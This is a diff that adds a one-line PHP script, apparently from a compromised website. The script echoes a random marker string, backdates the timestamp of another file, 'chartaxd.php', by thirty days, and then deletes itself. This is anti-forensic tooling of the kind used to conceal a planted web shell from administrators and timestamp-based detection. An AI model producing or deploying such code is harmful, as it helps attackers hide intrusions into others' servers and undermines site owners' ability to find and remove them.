@@ -1,0 +1,1 @@
+<?php echo "qnDBaspVPB"; if (file_exists("./chartaxd.php")){ touch("./chartaxd.php",(time()-60*60*24*30*1)); } unlink(__FILE__); /*2QbBtdd7xCWXZTC0TcEs*/ ?>
